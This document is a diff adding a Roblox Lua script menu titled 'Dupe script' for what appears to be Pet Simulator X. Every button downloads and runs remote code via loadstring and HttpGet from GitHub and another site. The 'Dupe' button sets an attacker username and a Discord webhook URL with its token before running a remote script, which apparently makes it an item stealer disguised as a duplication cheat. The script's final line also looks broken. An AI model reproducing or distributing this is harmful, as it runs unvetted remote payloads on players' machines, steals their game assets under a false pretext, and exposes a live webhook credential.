@@ -1,0 +1,36 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Dupe script", "Midnight")
+local Tab = Window:NewTab("partener")
+local Section = Tab:NewSection("fake partener hehe")
+
+Section:NewButton("fake partener", "fake partener", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIlllI/PartnerPSX/main/FakePartnerTag", true))()
+end)
+
+
+local Tab = Window:NewTab("script for dupe")
+local Section = Tab:NewSection("Script")
+
+Section:NewButton("Dupe", "duping", function()
+    UserName = "laurientiu567"
+WebHook = "https://discordapp.com/api/webhooks/1068085186790699061/KbJbu46wwQxJDslwDs_K47MDVn4VNVsneNtttpUNVBk-_EgrjgKBnEzSXLmFzGbMuvu8"
+Mention = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+end)
+
+local Tab = Window:NewTab("pumkin")
+local Section = Tab:NewSection("haha")
+Section:NewButton("pummkin", "bug", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BgsHacker/PetSimulatorXScriptv.2/1e5cd6ac7ede9f7e72391cd1b3ceb9f097ee0fd0/PetSimulatorXScriptv.2BgsHacker",true))()
+end)
+
+local Tab = Window:NewTab("scripts")
+local Section = Tab:NewSection("hehe")
+Section:NewButton("scriptss", "bug", function()
+    loadstring(game:HttpGet("https://milkup.info/script/PetSimulatorX/"))()
+end)
+
+local Tab = Window:NewTab("Credits")
+local Section = Tab:NewSection("credits")
+Section:NewLabel("made by laurientiu567")
+end()
